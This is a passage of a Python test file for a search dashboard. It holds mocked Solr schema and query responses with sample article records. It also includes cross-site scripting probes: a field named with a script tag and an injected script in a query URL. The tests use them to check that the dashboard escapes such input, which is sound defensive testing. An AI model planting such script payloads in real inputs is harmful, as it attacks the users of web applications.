field)\",\"docs\":8,\"distinct\":21,\"topTerms\":[\"and\",4,\"currency\",4,\"notes\",4,\"one\",4,\"coins\",4,\"bank\",2,\"of\",2,\"change.me112\",1,\"change.me1\",1,\"change.me\",1],\"histogram\":[\"1\",14,\"2\",2,\"4\",5]},\"title\":{\"type\":\"text_general\",\"schema\":\"ITS-M-----------\",\"index\":\"ITS-------------\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"change.me1\",1,\"change.me112\",1,\"change.me12\",1,\"change.me\",1],\"histogram\":[\"1\",4]}},\"info\":{\"key\":{\"I\":\"Indexed\",\"T\":\"Tokenized\",\"S\":\"Stored\",\"D\":\"DocValues\",\"M\":\"Multivalued\",\"V\":\"TermVector Stored\",\"o\":\"Store Offset With TermVector\",\"p\":\"Store Position With TermVector\",\"O\":\"Omit Norms\",\"F\":\"Omit Term Frequencies & Positions\",\"P\":\"Omit Positions\",\"H\":\"Store Offsets with Positions\",\"L\":\"Lazy\",\"B\":\"Binary\",\"f\":\"Sort Missing First\",\"l\":\"Sort Missing Last\"},\"NOTE\":\"Document Frequency (df) is not updated when a document is marked for deletion.  df values include deleted documents.\"}}\"\"\")\n\n    assert_equal(\n        # Dynamic fields not included for now\n        [{'isDynamic': False, 'isId': None, 'type': 'string', 'name': '&lt;script&gt;alert(1234)&lt;/script&gt;'},\n         {'isDynamic': False, 'isId': None, 'type': 'long', 'name': '_version_'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'author'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'category'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'comments'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'content'},\n         {'isDynamic': False, 'isId': None, 'type': 'string', 'name': 'content_type'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'description'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'features'},\n         {'isDynamic': False, 'isId': None, 'type': 'boolean', 'name': 'inStock'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'includes'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'keywords'},\n         {'isDynamic': False, 'isId': None, 'type': 'date', 'name': 'last_modified'},\n         {'isDynamic': False, 'isId': None, 'type': 'string', 'name': 'links'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'manu'},\n         {'isDynamic': False, 'isId': None, 'type': 'string', 'name': 'manu_exact'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'name'},\n         {'isDynamic': False, 'isId': None, 'type': 'payloads', 'name': 'payloads'},\n         {'isDynamic': False, 'isId': None, 'type': 'int', 'name': 'popularity'},\n         {'isDynamic': False, 'isId': None, 'type': 'float', 'name': 'price'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'resourcename'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_en_splitting_tight', 'name': 'sku'},\n         {'isDynamic': False, 'isId': None, 'type': 'location', 'name': 'store'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'subject'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'text'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general_rev', 'name': 'text_rev'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'title'},\n         {'isDynamic': False, 'isId': None, 'type': 'text_general', 'name': 'url'},\n         {'isDynamic': False, 'isId': None, 'type': 'float', 'name': 'weight'},\n         {'isDynamic': False, 'isId': True, 'type': 'string', 'name': 'id'}],\n         self.collection.fields_data(self.user, 'collection_1')\n    )\n\n  # TODO\n  # test facet with userlocation: t\u00fcrkiye, \u6771\u4eac, new york\n\n  def test_download(self):\n    MockResource.set_solr_response(\"\"\"{\"responseHeader\":{\"status\":0,\"QTime\":59,\"params\":{\"facet\":\"true\",\"facet.mincount\":\"1\",\"facet.limit\":\"100\",\"facet.date\":\"article_date\",\"f.article_date.facet.date.start\":\"NOW-7MONTH/DAYS\",\"wt\":\"json\",\"rows\":\"15\",\"user.name\":\"hue\",\"start\":\"0\",\"facet.sort\":\"count\",\"q\":\"*:*\",\"f.article_date.facet.date.end\":\"NOW-5MONTH\",\"doAs\":\"romain\",\"f.article_date.facet.date.gap\":\"+1DAYS\",\"facet.field\":[\"journal_title\",\"author_facet\"],\"fq\":[\"article_date:[2013-06-13T00:00:00Z TO 2013-06-13T00:00:00Z+1DAYS]\",\"journal_title:\\\\\"in\\\\\"\"]}},\"response\":{\"numFound\":4,\"start\":0,\"maxScore\":1.0,\"docs\":[{\"article_title\":\"Investigations for neonatal seizures.\",\"journal_issn\":\"1878-0946\",\"article_abstract_text\":[\"Seizures during the neonatal period are always medical emergencies. Apart from the need for rapid anticonvulsive treatment, the underlying condition is often not immediately obvious. In the search for the correct diagnosis, a thorough history, clinical examination, laboratory work-up, neurophysiological and neuroradiological investigations are all essential. A close collaboration between neonatologists, neuropaediatricians, laboratory specialists, neurophysiologists and radiologists facilitates the adequate care of the infant.\"],\"ontologies\":[\"36481|1 \"],\"article_date\":\"2013-06-13T00:00:00Z\",\"journal_title\":\"Seminars in fetal & neonatal medicine\",\"date_created\":\"2013-08-22T00:00:00Z\",\"journal_country\":\"Netherlands\",\"journal_iso_abbreviation\":\"Semin Fetal Neonatal Med\",\"id\":\"23680099\",\"author\":[\"B B Hallberg\",\"M M Blennow\"],\"article_pagination\":\"196-201\",\"journal_publication_date\":\"2013-08-22T00:00:00Z\",\"affiliation\":\"Department of Neonatology, Karolinska Institutet and University Hospital, Stockholm, Sweden. boubou.hallberg@ki.se\",\"language\":\"eng\",\"_version_\":1450807641462800385},{\"article_title\":\"Enantiomeric selection properties of \u03b2-homoDNA: enhanced pairing for heterochiral complexes.\",\"journal_issn\":\"1521-3773\",\"article_date\":\"2013-06-13T00:00:00Z\",\"journal_title\":\"Angewandte Chemie (International ed. in English)\",\"date_created\":\"2013-07-20T00:00:00Z\",\"journal_country\":\"Germany\",\"journal_iso_abbreviation\":\"Angew. Chem. Int. Ed. Engl.\",\"id\":\"23670912\",\"author\":[\"Daniele D D'Alonzo\",\"Jussara J Amato\",\"Guy G Schepers\",\"Matheus M Froeyen\",\"Arthur A Van Aerschot\",\"Piet P Herdewijn\",\"Annalisa A Guaragna\"],\"article_pagination\":\"6662-5\",\"journal_publication_date\":\"2013-06-24T00:00:00Z\",\"affiliation\":\"Dipartimento di Scienze Chimiche, Universit\u00e0 degli Studi di Napoli Federico II, Via Cintia 21, 80126 Napoli, Italy. dandalonzo@unina.it\",\"language\":\"eng\",\"_version_\":1450807661929955329},{\"article_title\":\"Interference of bacterial cell-to-cell communication: a new concept of antimicrobial chemotherapy breaks antibiotic resistance.\",\"journal_issn\":\"1664-302X\",\"article_abstract_text\":[\"Bacteria use a cell-to-cell communication activity termed \\\\\"quorum sensing\\\\\" to coordinate group behaviors in a cell density dependent manner. Quorum sensing influences the expression profile of diverse genes, including antibiotic tolerance and virulence determinants, via specific chemical compounds called \\\\\"autoinducers\\\\\". During quorum sensing, Gram-negative bacteria typically use an acylated homoserine lactone (AHL) called autoinducer 1. Since the first discovery of quorum sensing in a marine bacterium, it has been recognized that more than 100 species possess this mechanism of cell-to-cell communication. In addition to being of interest from a biological standpoint, quorum sensing is a potential target for antimicrobial chemotherapy. This unique concept of antimicrobial control relies on reducing the burden of virulence rather than killing the bacteria. It is believed that this approach will not only suppress the development of antibiotic resistance, but will also improve the treatment of refractory infections triggered by multi-drug resistant pathogens. In this paper, we review and track recent progress in studies on AHL inhibitors/modulators from a biological standpoint. It has been discovered that both natural and synthetic compounds can disrupt quorum sensing by a variety of means, such as jamming signal transduction, inhibition of signal production and break-down and trapping of signal compounds. We also focus on the regulatory elements that attenuate quorum sensing activities and discuss their unique properties. Understanding the biological roles of regulatory elements might be useful in developing inhibitor applications and understanding how quorum sensing is controlled.\"],\"ontologies\":[\"2402|1 \",\"1875|1 \",\"2047|3 \",\"36690|1 \",\"8120|1 \",\"1872|1 \",\"1861|1 \",\"1955|2 \",\"38027|1 \",\"3853|1 \",\"2237|3 \",\"37074|1 \",\"3043|2 \",\"36478|1 \",\"4403|1 \",\"2751|1 \",\"10751|1 \",\"36467|1 \",\"2387|1 \",\"7278|3 \",\"3826|1 \"],\"article_date\":\"2013-06-13T00:00:00Z\",\"journal_title\":\"Frontiers in microbiology\",\"date_created\":\"2013-06-30T00:00:00Z\",\"journal_country\":\"Switzerland\",\"journal_iso_abbreviation\":\"Front Microbiol\",\"id\":\"23720655\",\"author\":[\"Hidetada H Hirakawa\",\"Haruyoshi H Tomita\"],\"article_pagination\":\"114\",\"journal_publication_date\":\"2013-09-13T00:00:00Z\",\"affiliation\":\"Advanced Scientific Research Leaders Development Unit, Gunma University Maebashi, Gunma, Japan.\",\"language\":\"eng\",\"_version_\":1450807662055784448},{\"article_title\":\"The role of musical training in emergent and event-based timing.\",\"journal_issn\":\"1662-5161\",\"article_abstract_text\":[\"Introduction: Musical performance is thought to rely predominantly on event-based timing involving a clock-like neural process and an explicit internal representation of the time interval. Some aspects of musical performance may rely on emergent timing, which is established through the optimization of movement kinematics, and can be maintained without reference to any explicit representation of the time interval. We predicted that musical training would have its largest effect on event-based timing, supporting the dissociability of these timing processes and the dominance of event-based timing in musical performance. Materials and Methods: We compared 22 musicians and 17 non-musicians on the prototypical event-based timing task of finger tapping and on the typically emergently timed task of circle drawing. For each task, participants first responded in synchrony with a metronome (Paced) and then responded at the same rate without the metronome (Unpaced). Results: Analyses of the Unpaced phase revealed that non-musicians were more variable in their inter-response intervals for finger tapping compared to circle drawing. Musicians did not differ between the two tasks. Between groups, non-musicians were more variable than musicians for tapping but not for drawing. We were able to show that the differences were due to less timer variability in musicians on the tapping task. Correlational analyses of movement jerk and inter-response interval variability revealed a negative association for tapping and a positive association for drawing in non-musicians only. Discussion: These results suggest that musical training affects temporal variability in tapping but not drawing. Additionally, musicians and non-musicians may be employing different movement strategies to maintain accurate timing in the two tasks. These findings add to our understanding of how musical training affects timing and support the dissociability of event-based and emergent timing modes.\"],\"ontologies\":[\"36810|1 \",\"49002|1 \",\"3132|1 \",\"3797|1 \",\"37953|1 \",\"36563|2 \",\"524|1 \",\"3781|1 \",\"2848|1 \",\"17163|1 \",\"17165|1 \",\"49010|1 \",\"36647|3 \",\"36529|1 \",\"2936|1 \",\"2643|1 \",\"714|1 \",\"3591|1 \",\"2272|1 \",\"3103|1 \",\"2265|1 \",\"37051|1 \",\"3691|1 \"],\"article_date\":\"2013-06-14T00:00:00Z\",\"journal_title\":\"Frontiers in human neuroscience\",\"date_created\":\"2013-06-29T00:00:00Z\",\"journal_country\":\"Switzerland\",\"journal_iso_abbreviation\":\"Front Hum Neurosci\",\"id\":\"23717275\",\"author\":[\"L H LH Baer\",\"J L N JL Thibodeau\",\"T M TM Gralnick\",\"K Z H KZ Li\",\"V B VB Penhune\"],\"article_pagination\":\"191\",\"journal_publication_date\":\"2013-09-13T00:00:00Z\",\"affiliation\":\"Department of Psychology, Centre for Research in Human Development, Concordia University Montr\u00e9al, QC, Canada.\",\"language\":\"eng\",\"_version_\":1450807667479019520}]},\"facet_counts\":{\"facet_queries\":{},\"facet_fields\":{\"journal_title\":[\"in\",4,\"frontiers\",2,\"angewandte\",1,\"chemie\",1,\"ed\",1,\"english\",1,\"fetal\",1,\"human\",1,\"international\",1,\"medicine\",1,\"microbiology\",1,\"neonatal\",1,\"neuroscience\",1,\"seminars\",1],\"author_facet\":[\"Annalisa A Guaragna\",1,\"Arthur A Van Aerschot\",1,\"B B Hallberg\",1,\"Daniele D D'Alonzo\",1,\"Guy G Schepers\",1,\"Haruyoshi H Tomita\",1,\"Hidetada H Hirakawa\",1,\"J L N JL Thibodeau\",1,\"Jussara J Amato\",1,\"K Z H KZ Li\",1,\"L H LH Baer\",1,\"M M Blennow\",1,\"Matheus M Froeyen\",1,\"Piet P Herdewijn\",1,\"T M TM Gralnick\",1,\"V B VB Penhune\",1]},\"facet_dates\":{\"article_date\":{\"gap\":\"+1DAYS\",\"start\":\"2013-04-27T00:00:00Z\",\"end\":\"2013-06-28T00:00:00Z\"}},\"facet_ranges\":{}},\"highlighting\":{\"23680099\":{},\"23670912\":{},\"23720655\":{},\"23717275\":{}},\"spellcheck\":{\"suggestions\":[\"correctlySpelled\",false]}}\"\"\")\n\n    json_response = self.c.post(reverse('dashboard:download'), {\n        'type': 'json',\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n\n    json_response_content = json.loads(json_response.content)\n    assert_equal('application/json', json_response['Content-Type'])\n    assert_equal('attachment; filename=query_result.json', json_response['Content-Disposition'])\n    assert_equal(4, len(json_response_content), len(json_response_content))\n    assert_equal('Investigations for neonatal seizures.', json_response_content[0]['article_title'])\n\n    csv_response = self.c.post(reverse('dashboard:download'), {\n        'type': 'csv',\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n    csv_response_content = ''.join(csv_response.streaming_content)\n    assert_equal('application/csv', csv_response['Content-Type'])\n    assert_equal('attachment; filename=query_result.csv', csv_response['Content-Disposition'])\n    assert_equal(4 + 1 + 1, len(csv_response_content.split('\\n')), csv_response_content.split('\\n'))\n    assert_true('&lt;script&gt;alert(1234)&lt;/script&gt;,_version_,author,category,comments,content,content_type,description,features,inStock,includes,keywords,last_modified,links,manu,manu_exact,name,payloads,popularity,price,resourcename,sku,store,subject,text,text_rev,title,url,weight,id' in csv_response_content, csv_response_content)\n    # Fields does not exactly match the response but this is because the collection schema does not match the query response.\n    assert_true(\"\"\",1450807641462800385,\"['B B Hallberg', 'M M Blennow']\",,,,,,,,,,,,,,,,,,,,,,,,,,,23680099\"\"\" in csv_response_content, csv_response_content)\n\n    xls_response = self.c.post(reverse('dashboard:download'), {\n        'type': 'xls',\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n    xls_response_content = ''.join(xls_response.content)\n    assert_not_equal(0, len(xls_response_content))\n    assert_equal('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', xls_response['Content-Type'])\n    assert_equal('attachment; filename=query_result.xlsx', xls_response['Content-Disposition'])\n\n  def test_index_xss(self):\n    doc = Document2.objects.create(name='test_dashboard', type='search-dashboard', owner=self.user,\n                                   data=json.dumps(self.collection.data), parent_directory=self.home_dir)\n    try:\n      response = self.c.get(reverse('dashboard:index') + ('?collection=%s' % doc.id) + '&q=</script><script>alert(%27XSS%27)</script>')\n      assert_equal('{\"fqs\": [], \"qs\": [{\"q\": \"alert(\\'XSS\\')\"}], \"start\": 0}', response.context['query'])\n    finally:\n      doc.delete()\n\n  def test_augment_response(self):\n    collection = self._get_collection_param(self.collection)\n    query = QUERY\n    response = {\n      'response': {\n        'docs': [\n          {'id': 111, \"link-meta\": \"{\\\"type\\\": \\\"hdfs\\\", \\\"path\\\": \\\"/user/hue/pdf/sql_editor.pdf\\\"}\"}\n        ]\n      }\n    }\n\n    # Don't blow-up with Expecting property name: line 1 column 1 (char 1)\n    augment_response(collection, query, response)\n\n\nSOLR_LUKE_SCHEMA = \"\"\"{\"responseHeader\":{\"status\":0,\"QTime\":2},\"index\":{\"numDocs\":8,\"maxDoc\":8,\"deletedDocs\":0,\"version\":15,\"segmentCount\":5,\"current\":true,\"hasDeletions\":false,\"directory\":\"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(org.apache.solr.store.hdfs.HdfsDirectory@5efe087b lockFactory=org.apache.solr.store.hdfs.HdfsLockFactory@5106def2; maxCacheMB=192.0 maxMergeSizeMB=16.0)\",\"userData\":{\"commitTimeMSec\":\"1389233070579\"},\"lastModified\":\"2014-01-09T02:04:30.579Z\"},\"schema\":{\"fields\":{\"_version_\":{\"type\":\"long\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"author\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[\"author_s\",\"text\"],\"copySources\":[]},\"<script>alert(1234)</script>\":{\"type\":\"string\",\"flags\":\"I-S-M---OF-----l\",\"copyDests\":[\"text\"],\"copySources\":[]},\"category\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"comments\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"content\":{\"type\":\"text_general\",\"flags\":\"-TS-M-----------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"content_type\":{\"type\":\"string\",\"flags\":\"I-S-M---OF-----l\",\"copyDests\":[\"text\"],\"copySources\":[]},\"description\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"features\":{\"type\":\"text_general\",\"flags\":\"ITS-M-----------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"id\":{\"type\":\"string\",\"flags\":\"I-S-----OF-----l\",\"required\":true,\"uniqueKey\":true,\"copyDests\":[],\"copySources\":[]},\"inStock\":{\"type\":\"boolean\",\"flags\":\"I-S-----OF-----l\",\"copyDests\":[],\"copySources\":[]},\"includes\":{\"type\":\"text_general\",\"flags\":\"ITS--Vop--------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"keywords\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"last_modified\":{\"type\":\"date\",\"flags\":\"ITS------F------\",\"copyDests\":[],\"copySources\":[]},\"links\":{\"type\":\"string\",\"flags\":\"I-S-M---OF-----l\",\"copyDests\":[],\"copySources\":[]},\"manu\":{\"type\":\"text_general\",\"flags\":\"ITS-----O-------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\",\"manu_exact\"],\"copySources\":[]},\"manu_exact\":{\"type\":\"string\",\"flags\":\"I-------OF-----l\",\"copyDests\":[],\"copySources\":[\"manu\"]},\"name\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"payloads\":{\"type\":\"payloads\",\"flags\":\"ITS-------------\",\"copyDests\":[],\"copySources\":[]},\"popularity\":{\"type\":\"int\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"price\":{\"type\":\"float\",\"flags\":\"ITS-----OF------\",\"copyDests\":[\"price_c\"],\"copySources\":[]},\"resourcename\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"sku\":{\"type\":\"text_en_splitting_tight\",\"flags\":\"ITS-----O-------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"store\":{\"type\":\"location\",\"flags\":\"I-S------F------\",\"copyDests\":[],\"copySources\":[]},\"subject\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"text\":{\"type\":\"text_general\",\"flags\":\"IT--M-----------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[\"cat\",\"keywords\",\"resourcename\",\"includes\",\"url\",\"content\",\"author\",\"title\",\"manu\",\"description\",\"name\",\"features\",\"content_type\"]},\"text_rev\":{\"type\":\"text_general_rev\",\"flags\":\"IT--M-----------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"title\":{\"type\":\"text_general\",\"flags\":\"ITS-M-----------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"url\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[\"text\"],\"copySources\":[]},\"weight\":{\"type\":\"float\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]}},\"dynamicFields\":{\"*____amount_raw\":{\"type\":\"amount_raw_type_tlong\",\"flags\":\"IT------O-------\",\"copyDests\":[],\"copySources\":[]},\"*____currency\":{\"type\":\"currency_type_string\",\"flags\":\"I-------O-------\",\"copyDests\":[],\"copySources\":[]},\"*_b\":{\"type\":\"boolean\",\"flags\":\"I-S-----OF-----l\",\"copyDests\":[],\"copySources\":[]},\"*_bs\":{\"type\":\"boolean\",\"flags\":\"I-S-M---OF-----l\",\"copyDests\":[],\"copySources\":[]},\"*_c\":{\"type\":\"currency\",\"flags\":\"I-S------F------\",\"copyDests\":[],\"copySources\":[]},\"*_coordinate\":{\"type\":\"tdouble\",\"flags\":\"IT------OF------\",\"copyDests\":[],\"copySources\":[]},\"*_d\":{\"type\":\"double\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_ds\":{\"type\":\"double\",\"flags\":\"ITS-M---OF------\",\"copyDests\":[],\"copySources\":[]},\"*_dt\":{\"type\":\"date\",\"flags\":\"ITS------F------\",\"copyDests\":[],\"copySources\":[]},\"*_dts\":{\"type\":\"date\",\"flags\":\"ITS-M----F------\",\"copyDests\":[],\"copySources\":[]},\"*_en\":{\"type\":\"text_en\",\"flags\":\"ITS-M-----------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"*_f\":{\"type\":\"float\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_fs\":{\"type\":\"float\",\"flags\":\"ITS-M---OF------\",\"copyDests\":[],\"copySources\":[]},\"*_i\":{\"type\":\"int\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_is\":{\"type\":\"int\",\"flags\":\"ITS-M---OF------\",\"copyDests\":[],\"copySources\":[]},\"*_l\":{\"type\":\"long\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_ls\":{\"type\":\"long\",\"flags\":\"ITS-M---OF------\",\"copyDests\":[],\"copySources\":[]},\"*_p\":{\"type\":\"location\",\"flags\":\"I-S------F------\",\"copyDests\":[],\"copySources\":[]},\"*_pi\":{\"type\":\"pint\",\"flags\":\"I-S-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_s\":{\"type\":\"string\",\"flags\":\"I-S-----OF-----l\",\"copyDests\":[],\"copySources\":[]},\"*_ss\":{\"type\":\"string\",\"flags\":\"I-S-M---OF-----l\",\"copyDests\":[],\"copySources\":[]},\"*_t\":{\"type\":\"text_general\",\"flags\":\"ITS-------------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"*_td\":{\"type\":\"tdouble\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_tdt\":{\"type\":\"tdate\",\"flags\":\"ITS------F------\",\"copyDests\":[],\"copySources\":[]},\"*_tf\":{\"type\":\"tfloat\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_ti\":{\"type\":\"tint\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_tl\":{\"type\":\"tlong\",\"flags\":\"ITS-----OF------\",\"copyDests\":[],\"copySources\":[]},\"*_txt\":{\"type\":\"text_general\",\"flags\":\"ITS-M-----------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"attr_*\":{\"type\":\"text_general\",\"flags\":\"ITS-M-----------\",\"positionIncrementGap\":100,\"copyDests\":[],\"copySources\":[]},\"ignored_*\":{\"type\":\"ignored\",\"flags\":\"----M---OF------\",\"copyDests\":[],\"copySources\":[]},\"random_*\":{\"type\":\"random\",\"flags\":\"I-S------F------\",\"copyDests\":[],\"copySources\":[]}},\"uniqueKeyField\":\"id\",\"defaultSearchField\":null,\"types\":{\"alphaOnlySort\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.KeywordTokenizerFactory\",\"args\":{\"class\":\"solr.KeywordTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"TrimFilterFactory\":{\"args\":{\"class\":\"solr.TrimFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.TrimFilterFactory\"},\"PatternReplaceFilterFactory\":{\"args\":{\"replace\":\"all\",\"replacement\":\"\",\"pattern\":\"([^a-z])\",\"class\":\"solr.PatternReplaceFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.pattern.PatternReplaceFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.KeywordTokenizerFactory\",\"args\":{\"class\":\"solr.KeywordTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"TrimFilterFactory\":{\"args\":{\"class\":\"solr.TrimFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.TrimFilterFactory\"},\"PatternReplaceFilterFactory\":{\"args\":{\"replace\":\"all\",\"replacement\":\"\",\"pattern\":\"([^a-z])\",\"class\":\"solr.PatternReplaceFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.pattern.PatternReplaceFilterFactory\"}}},\"similarity\":{}},\"ancestor_path\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.KeywordTokenizerFactory\",\"args\":{\"class\":\"solr.KeywordTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.path.PathHierarchyTokenizerFactory\",\"args\":{\"delimiter\":\"/\",\"class\":\"solr.PathHierarchyTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}}},\"similarity\":{}},\"binary\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.BinaryField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"boolean\":{\"fields\":[\"inStock\",\"*_bs\",\"*_b\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.BoolField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.BoolField$1\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.BoolField$1\"},\"similarity\":{}},\"currency\":{\"fields\":[\"*_c\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.CurrencyField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"date\":{\"fields\":[\"last_modified\",\"*_dts\",\"*_dt\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieDateField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"descendent_path\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.path.PathHierarchyTokenizerFactory\",\"args\":{\"delimiter\":\"/\",\"class\":\"solr.PathHierarchyTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.KeywordTokenizerFactory\",\"args\":{\"class\":\"solr.KeywordTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}}},\"similarity\":{}},\"double\":{\"fields\":[\"*_ds\",\"*_d\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieDoubleField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"float\":{\"fields\":[\"weight\",\"price\",\"*_fs\",\"*_f\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieFloatField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokeniz